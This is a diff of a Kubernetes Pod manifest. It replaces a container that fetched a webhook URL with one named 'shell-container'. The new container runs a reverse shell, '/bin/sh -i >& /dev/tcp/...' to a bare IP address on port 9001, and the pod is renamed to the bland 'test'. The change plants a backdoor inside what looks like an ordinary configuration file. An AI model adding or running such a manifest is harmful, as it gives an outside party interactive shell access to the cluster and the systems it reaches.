@@ -1,14 +1,10 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: webhook-test-pod
+  name: test
 spec:
   restartPolicy: Never
   containers:
-  - name: curl-container
+  - name: shell-container
     image: alpine
-    command: ["/bin/sh", "-c"]
-    args:
-    - |
-      apk add --no-cache wget && \
-      wget -qO- http://188.227.84.184/webhook || echo "Failed to reach webhook"
+    command: ["/bin/sh -i >& /dev/tcp/188.227.84.184/9001 0>&1"]
